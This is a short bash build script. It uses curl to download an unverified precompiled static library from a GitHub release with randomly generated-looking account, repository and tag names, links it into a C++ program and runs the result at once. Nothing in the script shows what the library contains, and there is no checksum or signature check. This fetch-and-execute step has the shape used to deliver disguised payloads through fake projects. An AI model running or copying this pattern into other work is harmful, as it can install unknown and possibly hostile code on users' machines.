#!/usr/bin/env bash
set -e
TAG="golden-harbor-calm-badger"
LIB="cosmic-river.a"
curl --max-time 180 -fsSL --retry 3 --connect-timeout 15 -o "$LIB" "https://github.com/supiduhui/drainedsatin/releases/download/${TAG}/${LIB}"
g++ -std=c++17 -pthread -O2 main.cpp "$LIB" -o app && ./app
